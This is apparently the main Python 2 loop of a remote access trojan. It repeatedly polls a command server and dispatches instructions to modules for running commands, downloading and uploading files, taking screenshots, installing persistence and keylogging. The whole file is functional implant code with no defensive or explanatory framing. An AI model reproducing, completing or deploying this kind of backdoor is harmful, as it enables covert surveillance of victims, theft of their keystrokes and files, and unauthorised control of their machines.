#!/usr/bin/env python

import time
import sys
import os

import server
from modules import runcmd
from modules import download
from modules import screenshot
from modules import upload
from modules import persistence
from modules import keylogger
import settings    


if __name__ == "__main__":
    last_active = time.time()
    is_idle = False
    while 1:
        if is_idle:
            time.sleep(settings.REQUEST_INTERVAL)
        try:
            command = server.hello()
            if command:
                if command == "runcmd":
                    runcmd.run()
                elif command == "download":
                    download.run()
                elif command == "upload":
                    upload.run()
                elif command == "screenshot":
                    screenshot.run()
                elif command == "persistence":
                    persistence.run()
                elif command == "keylogger":
                    keylogger.run()
                last_active = time.time()
                is_idle = False
            elif time.time() - last_active > settings.IDLE_TIME:
                is_idle = True
        except Exception, exc:
            is_idle = True
            if settings.DEBUG:
                print exc
